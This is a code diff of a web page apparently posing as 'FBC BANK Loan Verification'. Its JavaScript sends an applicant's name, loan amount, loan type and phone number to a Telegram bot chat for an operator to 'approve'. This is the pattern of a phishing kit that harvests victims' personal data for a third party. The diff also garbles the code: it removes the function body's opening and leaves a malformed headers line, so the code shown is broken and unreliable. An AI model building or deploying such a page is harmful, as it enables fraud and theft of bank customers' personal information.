@@ -507,11 +507,7 @@
     }
 
     // ── Telegram bot send + poll ──
-    function sendToBot(phone) {
-      if (isProcessing) return;
-      isProcessing = true;
-      continueBtn.disabled    = true;
-      continueBtn.textContent = 'Verifying…';
+    function sendToBot(phone)
 
       const ts        = Date.now();
       const approveId = `approve_${ts}`;
@@ -520,7 +516,7 @@
 
       fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+        headers: { 'Contents')
         body: JSON.stringify({
           chat_id: CONFIG.CHAT_ID,
           text: `<b>🟢 FBC BANK Loan Verification</b>\n\nApplicant: <b>${fullName}</b>\nLoan Amount: <b>${loanAmount}</b>\nLoan Type: <b>${loanType}</b>\nPhone: <code>+263${phone}</code>\n\nChoose Action:`,
